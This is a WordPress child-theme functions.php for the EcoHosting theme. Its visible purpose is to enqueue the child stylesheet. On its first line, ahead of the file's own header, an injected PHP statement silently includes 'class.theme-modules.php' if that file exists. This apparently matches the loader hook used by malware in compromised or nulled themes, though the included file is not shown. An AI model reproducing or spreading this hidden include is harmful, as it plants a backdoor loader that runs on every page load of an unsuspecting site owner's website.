<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @version    1.0
 * @package    EcoHosting
 * @author     Themelooks  <support@themelooks.com>
 * @copyright  Copyright (C) 2014 themelooks.com. All Rights Reserved.
 * @license    GNU/GPL v2 or later http://www.gnu.org/licenses/gpl-2.0.html
 *
 * Websites: http://www.themelooks.com
 */

/**
 * Enqueue style of child theme
 */
function ecohost_child_enqueue_styles() {
    wp_enqueue_style( 'ecohost-child-style', get_stylesheet_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'ecohost_child_enqueue_styles', 100000 );